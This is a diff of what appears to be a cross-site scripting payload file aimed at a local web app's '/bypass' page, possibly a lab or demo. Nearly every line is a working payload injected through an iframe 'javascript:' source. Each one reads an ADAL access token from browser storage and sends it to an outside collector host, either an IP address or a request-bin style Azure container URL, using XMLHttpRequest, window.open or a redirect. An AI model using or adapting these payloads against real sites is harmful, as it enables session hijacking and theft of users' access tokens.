@@ -1,8 +1,8 @@
 var x = window.localStorage.getItem("adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e");var xhttp = new XMLHttpRequest();xhttp.open("GET", "http://104.40.75.104:8000/1ds8c7n1?token="+x, false);xhttp.send();
 
-http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:alert(window.localStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22))%3E%3Cp%3ERafael%3C%2Fp%3E%3C%2Fiframe%3E
+http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:alert(window.sessionStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22))%3E%3Cp%3ERafael%3C%2Fp%3E%3C%2Fiframe%3E
 
-http://localhost:4200/bypass?name=<iframe src=javascript:var x = window.localStorage.getItem("adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e");alert(x);window.open("http://104.40.75.104:8000/1ds8c7n1%3Ftoken="+window.localStorage.getItem('adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e'))></iframe>
+http://localhost:4200/bypass?name=<iframe src=javascript:var x = window.sessionStorage.getItem("adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e");alert(x);window.open("http://trashbin.centralus.azurecontainer.io/1k8h2hb1%3Ftoken="+window.sessionStorage.getItem('adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e'))></iframe>
 
 <iframe 
   
@@ -13,7 +13,7 @@ http://localhost:4200/bypass?name=<iframe src=javascript:var x = window.localSto
 
 </iframe>
 
-http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:window.location.href%3D%27http:%2F%2F104.40.75.104:8000%2F1ds8c7n1%3Ftoken%3D%27%2Bwindow.localStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22)%3E%3C%2Fiframe%3E
+http://localhost:4200/bypass?name=%3Ciframe%20src%3Djavascript:window.location.href%3D%27http:%2F%2Ftrashbin.centralus.azurecontainer.io%2F1k8h2hb1%3Ftoken%3D%27%2Bwindow.sessionStorage.getItem(%22adal.access.token.keyfea922e0-f20b-4038-bc96-aa7be62c6e2e%22)%3E%3C%2Fiframe%3E
 
 <script>
   var xhttp = new XMLHttpRequest();
